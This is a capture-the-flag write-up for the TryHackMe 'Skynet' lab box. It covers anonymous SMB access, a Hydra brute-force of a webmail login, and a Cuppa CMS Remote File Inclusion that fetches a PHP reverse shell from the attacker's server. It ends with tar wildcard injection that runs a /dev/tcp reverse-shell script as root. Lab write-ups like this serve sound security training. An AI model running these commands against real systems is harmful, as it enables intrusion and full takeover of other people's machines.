// Overview

Skynet is a Terminator-themed Linux box that chains together several classic misconfigurations. The path runs from anonymous SMB access to a leaked password list, into a webmail login, then pivots to a hidden CMS vulnerable to Remote File Inclusion. Root comes from a wildcard injection in a root-owned cron job.

Flags, credentials, and puzzle answers have been redacted per TryHackMe's write-up policy.

// Reconnaissance

Port Scanning

A full-port scan with default scripts and version detection exposes the core services:

$ nmap -sC -sV <target_ip>

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu
80/tcp    open  http        Apache httpd 2.4.18
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X

SMB Enumeration

The SMB service is the most interesting initial target. Listing shares shows an anonymous share that accepts null authentication:

$ smbclient -L //<target_ip>/ -N
$ smbclient //<target_ip>/anonymous -N

Inside the logs directory sits log1.txt — a short password list. A second file, attention.txt, names Miles Dyson and warns about a recent password reset. That's a username and a candidate password list in one shot.

Pro tip: Anonymous SMB shares are almost always worth a look. A leaked password list plus a named user is a brute-force waiting to happen — no wordlist required.

// SMB → Webmail

Brute-Forcing SquirrelMail

The web server hosts SquirrelMail at /squirrelmail. Pointing Hydra at the login form with the username milesdyson and the password list from the SMB share yields a hit:

$ hydra -l milesdyson -P log1.txt <target_ip> \
  http-post-form "/squirrelmail/src/redirect.php:\
  login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:\
  F=Unknown User or password incorrect"

Q1 Answer: Miles' email password is found in log1.txt — a short dictionary word with a Terminator-themed twist. [redacted].

Pivoting to Miles' SMB Share

Logging into the mailbox reveals a Samba Password reset email. The new password grants access to Miles' personal SMB share:

$ smbclient //<target_ip>/milesdyson -U milesdyson
Password: [redacted]

Inside a notes directory, important.txt contains:

1. Add features to beta CMS /[redacted]
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

Q2 Answer: The hidden directory is named in important.txt — a 16-character alphanumeric string. [redacted].

// Hidden CMS → Remote File Inclusion

Browsing to the hidden directory shows a personal page. Directory brute-forcing against this new path reveals an /administrator subdirectory, which loads a Cuppa CMS login panel. A quick searchsploit search identifies a Remote File Inclusion vulnerability in alertConfigField.php:

$ searchsploit cuppa cms
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion

Q3 Answer: The vulnerability is called Remote File Inclusion (RFI).

Confirming the LFI side of the vuln is a good sanity check before weaponising it:

http://<target_ip>/<hidden_dir>/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../etc/passwd

To turn it into a shell, host a PHP reverse shell on the attacker box and point the RFI at it:

$ python3 -m http.server 8000
$ nc -lvnp 4444

http://<target_ip>/<hidden_dir>/administrator/alerts/alertConfigField.php?urlConfig=http://<your_ip>:8000/php-reverse-shell.php

A listener on port 4444 catches a callback as www-data.

User Flag

The user flag sits in Miles' home directory and is readable by www-data:

$ cat /home/milesdyson/user.txt
THM{redacted}

Q4 Answer: The user flag is THM{redacted}.

// Privilege Escalation — tar Wildcard Injection

Checking cron jobs reveals that root runs a backup script every minute:

$ cat /etc/crontab
*/1 * * * * root /home/milesdyson/backups/backup.sh

The script uses tar with a wildcard from within /var/www/html:

cd /var/www/html && tar -czf /var/backups/backup.tgz *

That's vulnerable to tar wildcard injection. Because www-data can write to /var/www/html, we can create files with names that tar interprets as command-line options:

$ echo "bash -i >& /dev/tcp/<your_ip>/4445 0>&1" > shell.sh
$ touch -- "--checkpoint=1"
$ touch -- "--checkpoint-action=exec=bash shell.sh"

When the cron job next fires, the wildcard expands to include those filenames, and tar executes shell.sh as root. A listener on 4445 catches the root shell.

$ nc -lvnp 4445
$ cat /root/root.txt
THM{redacted}

Q5 Answer: The root flag is THM{redacted}.

Why this works: tar treats filenames beginning with -- as options. --checkpoint=1 forces tar to emit a checkpoint, and --checkpoint-action=exec=… runs a command at that checkpoint. The wildcard does the rest.

// Verdict

Skynet is a satisfying room because every step leads logically to the next — no dead ends, just sloppy operational security compounding. The anonymous SMB share leaking a password list is the hook, and the tar wildcard injection is the payoff. The RFI in Cuppa CMS is a nice mid-game pivot that teaches you to reach for searchsploit as soon as you fingerprint a product.

→ 8/10 — recommended for anyone comfortable with basic SMB and web enumeration who wants to practice chaining credentials across services.
